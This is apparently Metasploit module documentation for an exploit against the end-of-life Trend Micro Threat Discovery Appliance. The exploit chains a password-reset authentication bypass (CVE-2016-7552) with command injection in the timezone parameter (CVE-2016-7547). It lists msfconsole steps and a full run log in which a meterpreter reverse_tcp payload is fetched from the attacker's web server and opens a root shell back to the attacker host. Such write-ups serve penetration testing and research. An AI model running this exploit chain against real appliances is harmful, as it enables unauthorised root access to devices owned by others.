## Vulnerable Application

This module exploits two vulnerabilities the Trend Micro Threat Discovery Appliance. The first is an authentication
bypass vulnerability via a file delete in logoff.cgi which resets the admin password back to 'admin' upon a
reboot (CVE-2016-7552). The second is a cmdi flaw using the timezone parameter in the admin_sys_time.cgi interface (CVE-2016-7547).

Note: You have the option to use the authentication bypass or not since it requires that the server is rebooted.
The password reset will render the authentication useless. Typically, if an administrator cant login, they will bounce the box.
Therefore, this module performs a heart beat request until the box is bounced and then attempts to login and to
perform the command injection. This module has been tested on version 2.6.1062r1 of the appliance.

Trend Micro are not patching this vulnerability since this
product is now ([EOL](https://success.trendmicro.com/solution/1105727-list-of-end-of-life-eol-end-of-support-eos-trend-micro-products)).

![Demo](http://srcincite.io/poc/CVE-2016-7547.gif)

### Vulnerable Application Installation Steps

List the steps needed to make sure this thing works

- [ ] Download the ISO from ([Trend Micro's](http://download.trendmicro.com/products/tda/TDA_InstallationCD.2.6.1062r1.en_US.iso)) download site.
- [ ] Setup the VM to have 2 NIC's, 100 Gig HD and 4096 RAM.
- [ ] Click through the default install.
- [ ] You are ready to burn.

## Verification Steps

  1. Install the appliance
  2. Start metasploit
  3. Do: ```use exploit/multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi```
  4. Do: ```set payload linux/x86/meterpreter/reverse_tcp```
  5. Do: ```set RHOST [IP]```
  6. Do: ```set LHOST [IP]```
  7. Do: ```exploit```
  8. The exploit will reset the admin password, now reboot the VM.
  9. After reboot, you receive a root shell

## Options

### PASSWORD

Password for the system.  Default is `admin`.

### AUTHBYPASS

Bypass the system's authentication.  Defaults to `true`

## Scenarios

### Trendmicro Threat Discovery Appliance 2.6.1062r1

```
saturn:metasploit-framework mr_me$ ./msfconsole -qr scripts/trend.rc 
[*] Processing scripts/trend.rc for ERB directives.
resource (scripts/trend.rc)> use exploit/multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi
resource (scripts/trend.rc)> set RHOST 192.168.100.2
RHOST => 192.168.100.2
resource (scripts/trend.rc)> set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
resource (scripts/trend.rc)> set LHOST 192.168.100.13
LHOST => 192.168.100.13
resource (scripts/trend.rc)> exploit
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.100.13:4444 
[*] Bypassing authentication...
msf exploit(trendmicro_threat_discovery_admin_sys_time_cmdi) > 
[+] The password has been reset!
[*] Waiting for the reboot...
[*] 192.168.100.2:443 - Starting up our web service on http://192.168.100.13:1337/nnDBuOUMuKnxP ...
[*] Using URL: http://0.0.0.0:1337/nnDBuOUMuKnxP
[*] Local IP: http://192.168.100.13:1337/nnDBuOUMuKnxP
[+] Logged in
[*] 192.168.100.2:443 - Sending the payload to the server...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 192.168.100.2
[*] Meterpreter session 1 opened (192.168.100.13:4444 -> 192.168.100.2:46140) at 2016-09-23 14:59:08 -0500
[+] Deleted /tmp/rpNDXQZTB
[*] Server stopped.

msf exploit(trendmicro_threat_discovery_admin_sys_time_cmdi) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 3846 created.
Channel 1 created.


BusyBox v1.00 (2010.10.13-06:52+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

/bin/sh: can't access tty; job control turned off
/opt/TrendMicro/MinorityReport/www/cgi-bin # id
id
uid=0(root) gid=0(root)
/opt/TrendMicro/MinorityReport/www/cgi-bin #
```
